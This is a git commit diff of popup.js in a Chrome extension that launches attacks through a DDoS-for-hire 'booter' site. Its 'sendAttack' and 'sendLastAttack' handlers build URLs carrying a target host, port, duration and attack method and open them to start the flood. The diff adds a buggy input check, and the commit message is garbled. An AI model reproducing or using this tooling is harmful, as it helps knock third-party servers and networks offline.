47a54dd431bbd410ad9b4aa18aa26b23b64540f6
slimsy135 <58230822+slimsy135@users.noreply.github.com>
2020-09-06 17:07:54 +0100

    YESNOHEL[PME

--- popup/popup.js
+++ popup/popup.js
@@ -3,15 +3,19 @@ chrome.extension.sendMessage(["settings"], function(response) {
     $("#timeReq").append(`${response.settings[3].data})`);
     $("#methodReq").append(`${response.settings[1].data})`);
     function checkInput(ID, DEFAULTID) {
-        if ($(`#${ID}`).length != 0) {
-            return $(`#${ID}`).value;
-        } else {
+        if (document.getElementById(ID).length == "") {
             return response.settings[DEFAULTID].data;
+        } else {
+            return document.getElementById(ID).value;
         }
     }
     document.getElementById("sendAttack").addEventListener("click", function() {
-        var url = `https://www.stressthem.to/booter?autoboot&host=${$("#hostInput").value}&port=${checkInput("portInput", 2)}&time=${checkInput("timeInput", 3)}&method=${checkInput("methodInput", 1)}`;
-        console.log(url);
-        window.open(url, "_blank");
+        window.open(`https://www.stressthem.to/booter?autoboot&host=${checkInput("hostInput", 4)}&port=${checkInput("portInput", 2)}&time=${checkInput("timeInput", 3)}&method=${checkInput("methodInput", 1)}`, "_blank");
+    });
+    document.getElementById("settingsButton").addEventListener("click", function() {
+        window.open("/settings/settings.html", "_blank")
+    });
+    document.getElementById("sendLastAttack").addEventListener("click", function() {
+        window.open(`https://www.stressthem.to/booter?autoboot&host=${response.settings[4].data}&port=${response.settings[5].data}&time=${response.settings[6].data}&method=${response.settings[7].data}`, "_blank");
     });
 });
